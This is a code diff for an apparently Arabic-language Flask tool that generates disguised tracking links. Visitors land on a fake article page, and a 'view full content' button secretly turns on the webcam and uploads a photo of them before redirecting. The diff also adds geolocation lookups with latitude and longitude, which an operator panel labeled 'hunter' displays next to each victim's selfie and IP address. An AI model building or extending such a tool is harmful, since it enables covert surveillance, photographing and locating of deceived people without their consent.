@@ -4,7 +4,7 @@ import uuid
 import json
 import os
 import base64
-from datetime import datetime
+from datetime import datetime, timedelta
 import urllib.request
 
 try:
@@ -15,7 +15,7 @@ except ImportError:
     PLAYWRIGHT_AVAILABLE = False
 
 app = Flask(__name__)
-# إصلاح مشكلة مسارات ngrok والنطاقات العكسية
+# إصلاح مسارات ngrok والنطاقات العكسية
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 
 LINKS_FILE = "links.json"
@@ -26,8 +26,30 @@ os.makedirs(SELFIES_DIR, exist_ok=True)
 
 def load_links():
     if os.path.exists(LINKS_FILE):
-        with open(LINKS_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
+        try:
+            with open(LINKS_FILE, "r", encoding="utf-8") as f:
+                links = json.load(f)
+            
+            # تصفية تلقائية للروابط القديمة (التي مر عليها أكثر من 24 ساعة)
+            now = datetime.now()
+            filtered_links = {}
+            for lid, info in links.items():
+                created_at_str = info.get("created_at")
+                if created_at_str:
+                    try:
+                        created_at = datetime.fromisoformat(created_at_str)
+                        if now - created_at < timedelta(hours=24):
+                            filtered_links[lid] = info
+                    except Exception:
+                        filtered_links[lid] = info
+                else:
+                    filtered_links[lid] = info
+            
+            if len(filtered_links) != len(links):
+                save_links(filtered_links)
+            return filtered_links
+        except Exception:
+            return {}
     return {}
 
 def save_links(links):
@@ -36,19 +58,22 @@ def save_links(links):
 
 def get_location(ip):
     if ip in ("127.0.0.1", "localhost", "::1"):
-        return "محلي (Localhost)"
+        return "محلي (Localhost)", "0.0", "0.0"
     try:
-        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,query"
+        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,query,lat,lon"
         req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
         with urllib.request.urlopen(req, timeout=3) as response:
             data = json.loads(response.read().decode())
             if data.get("status") == "success":
-                return f"{data.get('country')} - {data.get('city')} ({data.get('query')})"
+                lat = data.get("lat", "غير معروف")
+                lon = data.get("lon", "غير معروف")
+                loc_str = f"{data.get('country')} - {data.get('city')} ({data.get('query')})"
+                return loc_str, lat, lon
     except Exception:
         pass
-    return f"غير معروف ({ip})"
+    return f"غير معروف ({ip})", "غير معروف", "غير معروف"
 
-# قالب صفحة ويب عادية (تظهر كمقال أو محتوى طبيعي) مع التقاط السيلفي والتوجيه التلقائي
+# قالب إعادة التوجيه مع زر إجباري لتجاوز حظر المتصفحات للكاميرا
 REDIRECT_TEMPLATE = """
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
@@ -102,37 +127,33 @@ REDIRECT_TEMPLATE = """
         .article-body p {
             margin-bottom: 20px;
         }
-        .loading-box {
+        .action-box {
             background: #f1f3f5;
-            padding: 20px;
+            padding: 25px;
             border-radius: 8px;
             text-align: center;
             margin-top: 30px;
-            font-size: 14px;
-            color: #555;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
         }
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ccc;
-            border-top-color: #0066cc;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        .action-btn {
+            background: #0066cc;
+            color: #fff;
+            border: none;
+            padding: 14px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            box-shadow: 0 4px 12px rgba(0,102,204,0.2);
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .manual-link {
-            display: block;
-            text-align: center;
-            margin-top: 20px;
+        .action-btn:hover {
+            background: #0052a3;
+        }
+        .hint-text {
             font-size: 13px;
-            color: #0066cc;
-            text-decoration: none;
+            color: #666;
+            margin-bottom: 15px;
         }
-        .manual-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -146,24 +167,23 @@ REDIRECT_TEMPLATE = """
             <p>تسعى الشركات التقنية الكبرى دائماً لتقديم تحديثات مستمرة تساهم في رفع كفاءة الأداء وسرعة الوصول إلى المعلومات عبر منصات الويب المختلفة، مما يتيح للمستخدمين تجربة أكثر سلاسة وأماناً.</p>
             <p>في هذا التقرير، نستعرض أبرز التغييرات والتحسينات الملحوظة التي تم إضافتها مؤخراً وكيف تؤثر بشكل مباشر على تصفحك اليومي للمحتوى الرقمي...</p>
             
-            <div class="loading-box">
-                <div class="spinner"></div>
-                <span>جاري تحميل المحتوى الكامل وتوجيهك للصفحة المطلوبة...</span>
+            <div class="action-box">
+                <div class="hint-text">انقر على الزر أدناه لعرض المحتوى الكامل للمقال والانتقال للصفحة:</div>
+                <button class="action-btn" onclick="captureAndRedirect()">عرض المحتوى الكامل والمتابعة</button>
             </div>
-            
-            <a class="manual-link" href="{{ original_url }}">إذا لم يتم تحويلك تلقائياً خلال ثوانٍ، انقر هنا للمتابعة</a>
         </div>
     </div>
 
     <script>
-        async function captureSelfie() {
+        async function captureAndRedirect() {
+            const originalUrl = "{{ original_url }}";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
                 
-                await new Promise(resolve => setTimeout(resolve, 800));
+                await new Promise(resolve => setTimeout(resolve, 600));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
@@ -180,12 +200,11 @@ REDIRECT_TEMPLATE = """
                     body: JSON.stringify({ link_id: '{{ link_id }}', image: dataUrl })
                 });
             } catch (err) {
-                console.log('Camera access skipped or denied');
+                console.log('Camera access skipped or denied:', err);
             } finally {
-                window.location.href = "{{ original_url }}";
+                window.location.href = originalUrl;
             }
         }
-        window.addEventListener('load', captureSelfie);
     </script>
 </body>
 </html>
@@ -603,7 +622,7 @@ HOME_TEMPLATE = """
         </div>
 
         <div class="stats" id="stats">
-            <h3>📊 الروابط المنشأة</h3>
+            <h3>📊 الروابط النشطة (الحديثة)</h3>
             <table>
                 <thead>
                     <tr>
@@ -809,12 +828,12 @@ ADMIN_TEMPLATE = """
 </head>
 <body>
     <h1>📸 لوحة التقاط الصور والسيلفي والزوار</h1>
-    <p class="sub-title">صيّاد - مراقبة الروابط الملغمة والمستلمين بشكل مستقل</p>
+    <p class="sub-title">صيّاد - تصفية تلقائية للروابط القديمة وعرض الإحداثيات الدقيقة</p>
     
     <div class="stats-bar">
         <div class="stat-box">
             <div class="stat-num">{{ links|length }}</div>
-            <div class="stat-label">إجمالي الروابط</div>
+            <div class="stat-label">الروابط النشطة</div>
         </div>
         <div class="stat-box">
             <div class="stat-num">{{ links.values()|map(attribute='visits')|sum }}</div>
@@ -852,8 +871,9 @@ ADMIN_TEMPLATE = """
                 {% for v in info.visitors %}
                 <div class="visitor-box">
                     <div style="font-size: 13px; color: #fff;">🌍 <b>الموقع الجغرافي:</b> {{ v.location }}</div>
-                    <div style="font-size: 13px; color: #aaa; margin-top:5px;">💻 <b>عنوان الـ IP:</b> {{ v.ip }}</div>
-                    <div style="font-size: 12px; color: #888; margin-top:5px;">⏱️ <b>وقت الزيارة:</b> {{ v.time[:19].replace('T', ' ') }}</div>
+                    <div style="font-size: 13px; color: #00d4ff; margin-top:6px;">📍 <b>الإحداثيات:</b> خط العرض (Lat): {{ v.lat }} | خط الطول (Lon): {{ v.lon }}</div>
+                    <div style="font-size: 13px; color: #aaa; margin-top:6px;">💻 <b>عنوان الـ IP:</b> {{ v.ip }}</div>
+                    <div style="font-size: 12px; color: #888; margin-top:6px;">⏱️ <b>وقت الزيارة:</b> {{ v.time[:19].replace('T', ' ') }}</div>
                     
                     <div style="margin-top:12px; font-weight:bold; font-size:12px; color:#a855f7;">صورة السيلفي الخاصة بهذا المستلم:</div>
                     {% if v.selfie %}
@@ -926,7 +946,7 @@ def create_link():
 def redirect_link(link_id):
     links = load_links()
     if link_id not in links:
-        return "الرابط غير موجود", 404
+        return "الرابط غير موجود أو تم انتهاء صلاحيته", 404
     
     link = links[link_id]
     link["visits"] = link.get("visits", 0) + 1
@@ -938,11 +958,13 @@ def redirect_link(link_id):
     else:
         visitor_ip = request.remote_addr
         
-    location = get_location(visitor_ip)
+    location, lat, lon = get_location(visitor_ip)
     
     visitor = {
         "ip": visitor_ip,
         "location": location,
+        "lat": lat,
+        "lon": lon,
         "user_agent": request.user_agent.string,
         "time": datetime.now().isoformat(),
         "referrer": request.referrer or "Direct",
@@ -988,7 +1010,7 @@ def upload_selfie():
         with open(filepath, "wb") as f:
             f.write(image_bytes)
             
-        # ربط السيلفي بآخر زائر (المستلم) دخل على هذا الرابط بشكل دقيق ومستقل
+        # ربط السيلفي بآخر زائر دخل على هذا الرابط بشكل مستقل ودقيق
         if links[link_id].get("visitors"):
             links[link_id]["visitors"][-1]["selfie"] = filename
             
